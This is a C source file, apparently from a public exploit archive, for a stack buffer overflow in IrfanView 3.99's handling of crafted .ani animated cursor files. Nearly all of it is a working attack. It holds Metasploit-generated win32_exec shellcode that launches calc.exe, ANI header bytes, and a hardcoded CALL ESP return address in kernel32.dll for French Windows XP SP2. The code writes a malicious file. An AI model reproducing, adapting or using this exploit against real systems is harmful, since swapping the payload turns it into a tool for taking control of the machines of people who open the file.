/***************************************************************************
*                IrfanView 3.99 .ANI File Buffer Overflow                  *
*                                                                          *
*                                                                          *
* IrfanView is vulnerable to a buffer overflow when opening a crafted .ani *
* file. The overflow occurs while it is creating a snapshot of the file.   *
* This exploit launches calc.exe.                                          *
*                                                                          *
* Tested against Win XP SP2 FR.                                            *
* Have Fun!                                                                *
*                                                                          *
* Coded and discovered by Marsu <Marsupilamipowa@hotmail.fr>               *
*                                                                          *
* Note: this has nothing in common with the LoadAniIcon Stack Overflow.    *
***************************************************************************/

#include "stdio.h"
#include "stdlib.h"

/* win32_exec -  EXITFUNC=process CMD=calc.exe Size=164 Encoder=PexFnstenvSub http://metasploit.com 
*/
unsigned char CalcShellcode[] =
"\x29\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x26"
"\x45\x32\xe3\x83\xeb\xfc\xe2\xf4\xda\xad\x76\xe3\x26\x45\xb9\xa6"
"\x1a\xce\x4e\xe6\x5e\x44\xdd\x68\x69\x5d\xb9\xbc\x06\x44\xd9\xaa"
"\xad\x71\xb9\xe2\xc8\x74\xf2\x7a\x8a\xc1\xf2\x97\x21\x84\xf8\xee"
"\x27\x87\xd9\x17\x1d\x11\x16\xe7\x53\xa0\xb9\xbc\x02\x44\xd9\x85"
"\xad\x49\x79\x68\x79\x59\x33\x08\xad\x59\xb9\xe2\xcd\xcc\x6e\xc7"
"\x22\x86\x03\x23\x42\xce\x72\xd3\xa3\x85\x4a\xef\xad\x05\x3e\x68"
"\x56\x59\x9f\x68\x4e\x4d\xd9\xea\xad\xc5\x82\xe3\x26\x45\xb9\x8b"
"\x1a\x1a\x03\x15\x46\x13\xbb\x1b\xa5\x85\x49\xb3\x4e\x3b\xea\x01"
"\x55\x2d\xaa\x1d\xac\x4b\x65\x1c\xc1\x26\x53\x8f\x45\x6b\x57\x9b"
"\x43\x45\x32\xe3";

unsigned char Ani_headers[] = 
"\x52\x49\x46\x46\x2a\x16\x00\x00\x41\x43\x4f\x4e\x4c\x49\x53\x54"
"\x44\x00\x00\x00\x49\x4e\x46\x4f\x49\x4e\x41\x4d\x0a\x00\x00\x00"
"\x4d\x65\x74\x72\x6f\x6e\x6f\x6d\x65\x00\x49\x41\x52\x54\x26\x00"
"\x00\x00\x4d\x61\x72\x73\x75\x70\x69\x6c\x61\x6d\x69\x50\x6f\x77"
"\x61\x40\x68\x6f\x74\x6d\x61\x69\x6c\x2e\x63\x6f\x6d\x20\x4d\x61"
"\x72\x63\x68\x20\x20\x30\x37\x00\x61\x6e\x69\x68\x24\x10\x00\x00"
"\x24";


int main(int argc, char* argv[])
{
	FILE* anifile;
	char evilbuff[1000];
	int ani_size;
	
	printf("[+] IrfanView 3.99 .ANI File Buffer Overflow\n");
	printf("[+] Coded and discovered by Marsu <Marsupilamipowa@hotmail.fr>\n");
	if (argc!=2) {
		printf("[+] Usage: %s <file.ani>\n",argv[0]);
		return 0;
	}
	
	ani_size=sizeof(Ani_headers)-1;
	memset(evilbuff,'C',1000);
	memcpy(evilbuff,Ani_headers,ani_size);
	memcpy(evilbuff+ani_size+459,"\x8b\x51\x81\x7c",4); 				/* CALL ESP 
in Kernel32.dll */
	memcpy(evilbuff+ani_size+466,CalcShellcode,strlen(CalcShellcode));
	memset(evilbuff+ani_size+466+strlen(CalcShellcode)+10,0,1);
	
	anifile=fopen(argv[1],"wb");
	fwrite( evilbuff, 1, sizeof(evilbuff), anifile );
	fclose(anifile);
	printf("[+] Done. Have fun!\n");
	return 0;
	
}